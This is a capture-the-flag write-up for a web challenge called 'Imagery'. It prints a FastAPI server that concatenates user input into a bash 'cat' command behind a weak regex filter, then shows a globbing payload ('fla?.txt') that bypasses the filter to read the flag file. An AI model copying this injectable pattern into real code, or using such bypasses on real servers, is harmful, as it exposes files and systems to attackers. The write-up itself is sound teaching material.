---
title: "Lag'n'Crash CTF: Imagery"
date: "2021-03-15T08:40:10Z"
description: "Write-up for Lag'n'Crash CTF challenge, Imagery"
---
# Challenge Overview
[_Skip to solution_](#solution)

This challenge is under the Web category.
> Hey I found this cool website. I wonder if they actually hide smth on the website.
>
> http://challenge1.lagncrash.com:18675/

On the webpage, we are presented with:

![image of rick roll and nothing else](./imagery_rick_roll.png)

And nothing else. Here's the full source:

```html
<!DOCTYPE html>
<html>
  <head>
    <!-- main.py -->
    <title>Imagery</title>
    <style>
      .image {
        display: block;
        max-width: 300px;
        margin: 0 auto;
      }
    </style>
  </head>
  <body>
      <img class="image" src="/file?name=img/image.jpg">
    </div>
  </body>
</html>
```

# Solution
This challenge attempts to demonstrate the unsafe nature of using regular
expressions to filter user inputs. Furthermore, it is unsafe to use user inputs
directly in shell commands. In practice, it is a good idea never to write your
own code to filter user inputs. Retrieving files based on a user's input can be
delegated to a cloud service (e.g. AWS buckets) or delegated to a reverse proxy
(e.g. NGINX).

The web page's source code shows that the image shown is retrieved by a
suspicious url: `http://challenge1.lagncrash.com:18675/file?name=image.png`.

There is also mention of a `main.py` as a HTML comment. Navigating to
`http://challenge1.lagncrash.com:18675/file?name=main.py`, we get the following
source code:

```python
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, Response
from user_agents import parse
from os import path
import re
import subprocess

app = FastAPI()

def check_request(request):
    user_agent = None
    for header in request['headers']:
        if header[0] == b'user-agent':
            user_agent = header[1].decode()

    if not user_agent:
        return False
        
    user_agent = parse(user_agent)
    if user_agent.is_bot:
        return False
    
    return True

@app.get('/', response_class=HTMLResponse)
async def index(request: Request):
    if not check_request(request):
        raise HTTPException(400, 'Malicious request received!')

    with open('index.html', 'r') as file:
        html = file.read()
        return HTMLResponse(html)

allowed_chars = re.compile(r'^[a-zA-Z0-9\?/\.]*$')
def check_malicious_filename(name):
    if not allowed_chars.match(name):
        print("yessssssssssssss")
        return True

    if 'etc' in name or 'tmp' in name or 'flag.txt' in name:
        return True
    return path.isabs(name)

@app.get('/file')
async def get_file(request: Request, name='main.py'):
    if not check_request(request):
        raise HTTPException(400, 'Malicious request received!')

    if check_malicious_filename(name):
        raise HTTPException(400, 'Malicious request received')
    
    try:
        process = subprocess.check_output(['/bin/bash',"-c", "cat " + name])
    except subprocess.CalledProcessError:
        raise HTTPException(400, 'Malicious request received')

    return Response(process)
```

In particular, notice that the request is filtered by:
```python
allowed_chars = re.compile(r'^[a-zA-Z0-9\?/\.]*$')
# ...
    if 'etc' in name or 'tmp' in name or 'flag.txt' in name:
```

This means that any alphanumeric character and `?./` are accepted. The file name
must not contain `flag.txt` as well. We have to find a way to get `flag.txt`
without typing it out. We can do so using `?`:
```
http://challenge1.lagncrash.com:18675/file?name=fla?.txt
```

And we get the flag `LNC{R3T4ArD_IM4G3S}`.

`?` matches one of any character and is part of the globbing utilities provided
by bash, aside from `*` (match any multiple times) and also `[]` (match one
listed in the brackets).

You can find a list of other common command injection payloads [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
